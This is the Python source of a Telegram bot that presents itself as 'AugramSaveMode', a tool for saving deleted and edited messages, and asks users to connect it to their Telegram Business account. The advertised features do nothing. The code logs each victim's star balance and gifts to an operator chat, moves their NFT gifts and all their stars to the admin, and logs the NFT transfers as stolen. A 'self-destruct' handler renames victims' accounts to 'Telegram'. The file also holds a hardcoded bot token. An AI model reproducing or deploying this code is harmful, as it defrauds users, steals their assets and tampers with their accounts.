from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import random

from datetime import datetime
import requests
import asyncio
import logging

# --- Constants ---
# IMPORTANT: Fill in your bot token and admin IDs here
TOKEN = "7836011672:AAHz_jFB83YkK4htm6nLq6KFAJEM8gGMg2Q"  # Your bot token
LOG_CHAT_ID = -4831448825  # Chat ID for logs (e.g., -100123456789)
ADMIN_IDS = [7562628646]  # Admin IDs (e.g., [123456789, 987654321])

MAX_GIFTS_PER_RUN = 1000
last_messages = {} # Stores last message ID for pagination edits
codes = {} # Stores unique codes for business account withdrawal
storage = MemoryStorage()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Bot Initialization ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

# --- FSM States ---
class Draw(StatesGroup):
    user_id_to_transfer = State() # User ID to whom gifts/stars will be transferred
    gift_selection_page = State() # Current page in gift selection pagination

# --- Keyboards ---
def main_menu_kb():
    """Returns the main menu inline keyboard."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📌 Сохранять одноразовые сообщения", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="🗑️ Сохранять удалённые сообщения", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="✏️ Сохранять отредактированные сообщения", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="🎞 Анимации с текстом", callback_data="animations")],
        [InlineKeyboardButton(text="📖 Инструкция", url="https://t.me/+lcvPndWQzcA4NDU1")] # Ensure this URL is valid
    ])

async def get_gifts_keyboard(page: int = 0):
    """
    Returns an InlineKeyboardMarkup with available gifts for pagination.
    Fetches gifts from the Telegram Bot API.
    """
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    builder = InlineKeyboardBuilder()
    gifts = []
    try:
        response = requests.get(url)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            if not gifts:
                logging.info("No gifts available from API.")
                return InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Нет доступных подарков", callback_data="empty")]
                ])
        else:
            logging.error(f"Telegram API error in getAvailableGifts: {data.get('description', 'Unknown error')}")
            return InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Ошибка загрузки подарков", callback_data="empty")]
            ])

    except requests.exceptions.RequestException as e:
        logging.error(f"Request to Telegram API failed: {e}")
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Ошибка сети", callback_data="empty")]
        ])
    except Exception as e:
        logging.error(f"An unexpected error occurred while fetching gifts: {e}")
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Неизвестная ошибка", callback_data="empty")]
        ])

    items_per_page = 9
    start = page * items_per_page
    end = start + items_per_page
    
    current_gifts = gifts[start:end]
    if not current_gifts and page > 0 and gifts: 
        return await get_gifts_keyboard(page - 1)
    
    for gift in current_gifts:
        builder.button(
            text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
            callback_data=f"gift_{gift['id']}"
        )
    builder.adjust(2) # 2 buttons per row

    total_pages = (len(gifts) + items_per_page - 1) // items_per_page -1 if len(gifts) > items_per_page else 0
    
    # Pagination controls
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="Назад", callback_data=f"down_{page - 1}"))
    else:
        nav_buttons.append(InlineKeyboardButton(text="•", callback_data="empty"))

    nav_buttons.append(InlineKeyboardButton(text=f"{page + 1}/{total_pages + 1}", callback_data="empty"))

    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton(text="Вперед", callback_data=f"next_{page + 1}"))
    else:
        nav_buttons.append(InlineKeyboardButton(text="•", callback_data="empty"))
    
    builder.row(*nav_buttons)
    return builder.as_markup()

# --- Helper Function for Transfer Logic ---
async def _transfer_all_assets(business_id: str, target_chat_id: int):
    """
    Transfers all available regular gifts (by converting to stars) and unique gifts (NFTs)
    and stars from a business account to the specified target chat ID (admin).
    """
    stolen_nfts = []
    stolen_count = 0
    
    # 1. Process gifts (convert regular gifts to stars, transfer unique gifts)
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        logging.error(f"❌ Ошибка при получении подарков для business_id {business_id}: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков для business_id {business_id}: {e}")
        return False, "Произошла ошибка при получении списка подарков."

    if not gifts_list:
        await bot.send_message(chat_id=LOG_CHAT_ID, text=f"У пользователя {business_id} нет подарков.")
        # Return True because there's nothing to transfer, not an error
        return True, "У этого бизнес-аккаунта нет доступных подарков."
        
    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    
    for gift in gifts_to_process:
        owned_gift_id = gift.owned_gift_id
        gift_type = gift.type
        
        # Regular gifts: convert to stars
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, owned_gift_id)
                logging.info(f"Converted regular gift {owned_gift_id} for business {business_id} to stars.")
            except Exception as e:
                logging.error(f"Error converting regular gift {owned_gift_id} for business {business_id}: {e}")
                pass 
        
        # Unique (NFT) gifts: transfer to ADMIN_IDS
        elif gift_type == "unique":
            is_transferable = gift.can_be_transferred
            transfer_star_count = gift.transfer_star_count # This is cost of transfer
            gift_name = gift.gift.name.replace(" ", "") if gift.gift and gift.gift.name else "unknown_nft"

            if is_transferable:
                # Try to transfer to the main admin (target_chat_id)
                try:
                    await bot.transfer_gift(business_id, owned_gift_id, target_chat_id, transfer_star_count)
                    stolen_nfts.append(f"t.me/nft/{gift_name}")
                    stolen_count += 1
                    logging.info(f"Transferred NFT {owned_gift_id} from business {business_id} to admin {target_chat_id}.")
                except Exception as e:
                    logging.error(f"Failed to transfer NFT {owned_gift_id} from business {business_id} to admin {target_chat_id}: {e}")
                    # Log but continue to next gift/star transfer
                    pass 

    # Log stolen NFTs
    if stolen_count > 0:
        text = (
            f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await bot.send_message(LOG_CHAT_ID, f"Не удалось украсть подарки NFT (или их не было) для business_id {business_id}.")
    
    # 2. Transfer stars
    try:
        stars_balance = await bot.get_business_account_star_balance(business_id)
        amount_to_transfer = int(stars_balance.amount)
        
        if amount_to_transfer > 0:
            if ADMIN_IDS: # Ensure there's at least one admin
                await bot.transfer_business_account_stars(business_id, amount_to_transfer, target_chat_id) 
                await bot.send_message(LOG_CHAT_ID, f"🌟 {amount_to_transfer} звёзд выведено از бизнес-اکانت {business_id} به کاربر {target_chat_id}")
            else:
                logging.warning(f"No admin IDs configured to receive stars from business account {business_id}.")
                await bot.send_message(LOG_CHAT_ID, f"No admin IDs configured to receive stars from business account {business_id}.")
                return False, "No admin IDs configured to receive stars."
        else:
            await bot.send_message(LOG_CHAT_ID, f"У пользователя {business_id} нет звезд для вывода.")
            return True, "У пользователя нет звезд для вывода."
    except Exception as e:
        logging.error(f"🚫 Ошибка при выводе звёзд از business_id {business_id}: {e}")
        await bot.send_message(LOG_CHAT_ID, f"🚫 Ошибка при выводе звёзд از business_id {business_id}: {e}")
        return False, f"Произошла ошибка при попытке вывода звёзд: {e}"
    
    return True, "Все доступные активы успешно выведены."

# --- Handlers ---

@dp.message(CommandStart())
async def start_cmd(message: types.Message):
    """Handles the /start command."""
    if message.text == "/start instruction":
        try:
            await message.answer(
                text=(
                    "<b>Как подключить бота к бизнес-аккаунту:</b>\n\n"
                    "1. Перейдите в «Настройки» → <i>Telegram для бизнеса</i>\n"
                    "2. Перейдите в <i>Чат-боты</i>\n"
                    "3. Добавьте <b>@AugramSaveMode_bot</b> в список\n\n" # نام ربات باید درست باشد
                    "После этого функции начнут работать автоматически ✅"
                )
            )
        except Exception as e:
            logging.error(f"Error sending instruction: {e}")
            await message.answer("Произошла ошибка при отправке инструкции. Пожалуйста, попробуйте позже.")
        return

    try:
        await message.answer(
            text=(
                "👋 Добро пожаловать в <b>AugramSaveMode</b>!\n\n"
                "🔹 Сохраняйте одноразовые сообщения\n"
                "🔹 Сохраняйте удалённые сообщения\n"
                "🔹 Сохраняйте отредактированные сообщения\n"
                "📖 <b>Перед началом ознакомьтесь с инструкцией</b>\n\n"
                "Выберите, что хотите сохранять:"
            ),
            reply_markup=main_menu_kb()
        )
    except Exception as e:
        logging.error(f"Error sending start message: {e}")
        await message.answer("Произошла ошибка при запуске бота. Пожалуйста, попробуйте позже.")

@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    """Prompts users to read instructions before using features."""
    await callback.answer("Сначала нажмите на 📖 Инструкцию сверху!", show_alert=True)

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    """Handles new business account connections."""
    business_id = business_connection.id
    user_id = business_connection.user.id

    builder = InlineKeyboardBuilder()
    builder.button(
        text="⛔️ Удалить подключение", 
        callback_data=f"destroy:{business_id}"
    )
    
    code = str(random.randint(1000, 9999)) # 4-digit code
    codes[code] = business_id # Store business_id linked to the code
    
    user = business_connection.user
    
    try:
        info = await bot.get_business_connection(business_id)
        rights = info.rights
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)
        
        # Calculations
        total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
        nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
        
        # Calculation of NFT transfer cost (25 stars for each NFT)
        nft_transfer_cost = len(nft_gifts) * 25
        # Total cost (conversion of regular + NFT transfer)
        total_withdrawal_cost = total_price + nft_transfer_cost
        
        # Text formatting
        header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
        
        user_info = (
            f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
            f"├─ ID: <code>{user.id}</code>\n"
            f"├─ Username: @{user.username or 'нет'}\n"
            f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
        )
        
        balance_info = (
            f"<blockquote>💰 <b>Баланс:</b>\n"
            f"├─ Доступно звёзд: {int(stars.amount):,}\n"
            f"├─ Звёрд در подарках: {total_price:,}\n"
            f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
        )
        
        gifts_info = (
            f"<blockquote>🎁 <b>Подарки:</b>\n"
            f"├─ Всего: {gifts.total_count}\n"
            f"├─ Обычные: {gifts.total_count - len(nft_gifts)}\n"
            f"├─ NFT: {len(nft_gifts)}\n"
            f"├─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)\n"
            f"╰─ <b>Общая стоимость вывода:</b> {total_withdrawal_cost:,} звёзд</blockquote>"
        )
        
        # Add NFT list if any
        nft_list_str = ""
        if nft_gifts:
            nft_items = []
            for idx, g in enumerate(nft_gifts, 1):
                try:
                    gift_id = getattr(g, 'id', 'скрыт')
                    nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
                except AttributeError:
                    nft_items.append(f"├─ NFT #{idx} (скрыт) - 25⭐")
            
            nft_list_str = "\n<blockquote>🔗 <b>NFT подарки:</b>\n" + \
                         "\n".join(nft_items) + \
                         f"\n╰─ <b>Итого:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"
        
        rights_info = (
            f"<blockquote>🔐 <b>Права бота:</b>\n"
            f"├─ Основные: {'✅' if rights.can_read_messages else '❌'} Чтение | "
            f"{'✅' if rights.can_delete_all_messages else '❌'} Удаление\n"
            f"├─ Профиль: {'✅' if rights.can_edit_name else '❌'} Имя | "
            f"{'✅' if rights.can_edit_username else '❌'} Username\n"
            f"╰─ Подарки: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация | "
            f"{'✅' if rights.can_transfer_stars else '❌'} Перевод</blockquote>\n\n"
        )
        
        footer = (
            f"<blockquote>🔑 <b>Код برای вывода:</b> <code>{code}</code>\n"
            f"ℹ️ <i>Перенос каждого NFT подарка стоит 25 звёзд</i>\n"
            f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
        )
        
        full_message = header + user_info + balance_info + gifts_info + nft_list_str + rights_info + footer
        
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error handling business connection for user {user_id}: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при обработке бизнес-подключения برای пользователя {user_id}: {e}")

@dp.callback_query(F.data == "draw_stars")
async def draw_stars_callback(callback: types.CallbackQuery, state: FSMContext):
    """
    Initiates the star withdrawal process from the admin panel.
    Asks the admin for the target user ID.
    """
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("У вас нет доступа к этой функции.", show_alert=True)
        return
    
    await callback.message.answer(
        text="Введите айди юзера кому перевести подарки"
    )
    await state.set_state(Draw.user_id_to_transfer)
    await callback.answer() # Acknowledge the callback

@dp.message(F.text, Draw.user_id_to_transfer)
async def process_user_id_for_gift(message: types.Message, state: FSMContext):
    """Processes the user ID entered by the admin for gift transfer."""
    try:
        user_id_to_transfer_val = int(message.text)
    except ValueError:
        await message.answer("Некорректный ID пользователя. Пожалуйста, введите числовой ID.")
        return
    
    await state.update_data(user_id_to_transfer=user_id_to_transfer_val)
    await state.update_data(current_page=0) # Initialize page to 0

    markup = await get_gifts_keyboard(page=0)
    msg = await message.answer(
        text="Актуальные подарки:",
        reply_markup=markup
    )
    last_messages[message.chat.id] = msg.message_id # Store message_id for editing
    
    await state.set_state(Draw.gift_selection_page) # Set state to gift selection page

@dp.callback_query(F.data.startswith("gift_"), Draw.gift_selection_page)
async def transfer_selected_gift(callback: CallbackQuery, state: FSMContext):
    """Transfers the selected gift to the specified user."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("У вас нет доступа к этой функции.", show_alert=True)
        return

    gift_id_to_send = callback.data.split('_')[1]
    user_data = await state.get_data()
    user_id_to_transfer_val = user_data.get('user_id_to_transfer')

    if not user_id_to_transfer_val:
        await callback.message.answer("Ошибка: ID пользователя برای انتقال پیدا نشد. دوباره شروع کنید.")
        await state.clear()
        return

    try:
        await bot.send_gift(
            gift_id=gift_id_to_send, 
            chat_id=int(user_id_to_transfer_val)
        )
        await callback.message.answer("Подарок успешно отправлен!")
    except Exception as e:
        logging.error(f"Error sending gift {gift_id_to_send} to {user_id_to_transfer_val}: {e}")
        await callback.message.answer(f"Не удалось отправить подарок. Ошибка: {e}")
    finally:
        await state.clear() # Clear state after operation
        await callback.answer()

@dp.callback_query(F.data.startswith(("next_", "down_")), Draw.gift_selection_page)
async def edit_gift_page(callback: CallbackQuery, state: FSMContext):
    """Handles pagination for the gift selection."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("У вас нет доступа к этой функции.", show_alert=True)
        return

    user_data = await state.get_data()
    current_page = user_data.get('current_page', 0)
    action, page_num_str = callback.data.split("_")
    
    new_page = current_page 

    if action == "next":
        new_page = current_page + 1
    elif action == "down":
        new_page = current_page - 1
    
    await state.update_data(current_page=new_page) # Update the current page in FSM

    message_id = last_messages.get(callback.from_user.id)
    if message_id:
        markup = await get_gifts_keyboard(page=new_page)
        try:
            await bot.edit_message_reply_markup(
                chat_id=callback.from_user.id,
                message_id=message_id,
                reply_markup=markup
            )
        except Exception as e:
            logging.error(f"Error editing message reply markup: {e}")
            await callback.message.answer("Не удалось обновить список подарков. Попробуйте снова.")
    else:
        await callback.message.answer("Сообщение برای ویرایش پیدا نشد. لطفا فرآیند انتخاب هدیه را دوباره شروع کنید.")
    await callback.answer()


@dp.message(Command("ap"))
async def admin_panel(message: types.Message):
    """Displays the admin panel."""
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("У вас нет доступа к этой панели.")
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️ Вывод звезд",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="Админ панель:",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    """Initiates 'self-destruction' mode for a business account."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("У вас нет доступа к этой функции.", show_alert=True)
        return
    
    business_id = callback.data.split(":")[1]
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⛔️ Отмена самоуничтожения",
            callback_data=f"decline:{business_id}"
        )
    )
    
    try:
        await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
        await bot.set_business_account_bio(business_id, "Telegram")
        
        await callback.message.answer(
            text="⛔️ Режим самоуничтожения включен. Нажмите кнопку для отключения.",
            reply_markup=builder.as_markup()
        )
    except Exception as e:
        logging.error(f"Error in destroy_account for business_id {business_id}: {e}")
        await callback.message.answer(f"Не удалось включить режим самоуничтожения. Ошибка: {e}")
    finally:
        await callback.answer()

@dp.callback_query(F.data.startswith("decline:"))
async def decline_self_destruction(callback: CallbackQuery):
    """Cancels the 'self-destruction' mode for a business account."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("У вас нет доступа к этой функции.", show_alert=True)
        return

    business_id = callback.data.split(":")[1]
    try:
        await bot.set_business_account_name(business_id, "Bot")
        await bot.set_business_account_bio(business_id, "Some bot")
        await callback.message.answer("Аккаунт спасен от удаления.")
    except Exception as e:
        logging.error(f"Error in decline_self_destruction for business_id {business_id}: {e}")
        await callback.message.answer(f"Не удалось отменить самоуничтожение. Ошибка: {e}")
    finally:
        await callback.answer()

@dp.message(Command("transfer"))
async def transfer_all_assets_command(message: types.Message):
    """
    Admin command to transfer all gifts and stars from a business account.
    Requires a business_id as argument.
    Usage: /transfer <business_id>
    """
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("У вас нет доступа к этой функции.")
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: `/transfer <business_id>`", parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    business_id = args[1]
    
    await message.answer(f"Начинаю вывод активов из бизнес-аккаунта `{business_id}`...", parse_mode=ParseMode.MARKDOWN_V2)
    
    success, msg = await _transfer_all_assets(business_id, message.from_user.id) # Transfer to the admin who sent the command
    
    if success:
        await message.answer(f"✅ Готово: {msg}")
    else:
        await message.answer(f"❌ Ошибка при выводе: {msg}")


@dp.message(F.text)
async def process_withdrawal_code(message: types.Message):
    """Processes the withdrawal code entered by the user."""
    if message.text not in codes:
        return # Ignore messages that are not withdrawal codes

    business_id = codes.pop(message.text) # Use pop to remove the code after use
    
    await message.answer(f"Начинаю вывод активов из бизнес-аккаунта `{business_id}`...", parse_mode=ParseMode.MARKDOWN_V2)
    
    # Use the shared helper function
    success, msg = await _transfer_all_assets(business_id, ADMIN_IDS[0]) # Transfer to the first admin in ADMIN_IDS
    
    if success:
        await message.answer(f"✅ Готово: {msg}")
    else:
        await message.answer(f"❌ Ошибка при выводе: {msg}")
    

async def main():
    logging.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
